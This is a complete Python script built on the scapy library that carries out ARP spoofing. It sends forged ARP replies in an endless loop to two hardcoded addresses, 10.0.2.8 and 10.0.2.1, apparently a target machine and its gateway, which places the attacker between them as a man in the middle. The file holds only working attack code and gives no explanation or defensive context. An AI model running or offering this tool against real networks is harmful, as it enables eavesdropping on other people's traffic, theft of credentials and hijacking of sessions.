#! /usr/bin/env python

import time
import scapy.all as scapy


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast_frame = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_packet = broadcast_frame / arp_request
    answered = scapy.srp(arp_packet, timeout=1, verbose=False)[0]
    return answered[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
    scapy.send(packet, verbose=False)


sent_packets_count = 0
try:
    while True:
        spoof("10.0.2.8", "10.0.2.1")
        spoof("10.0.2.1", "10.0.2.8")
        sent_packets_count += 2
        print("\r[+] Sending 2 packets regularly... Total packets sent: " + str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Execution aborted.")
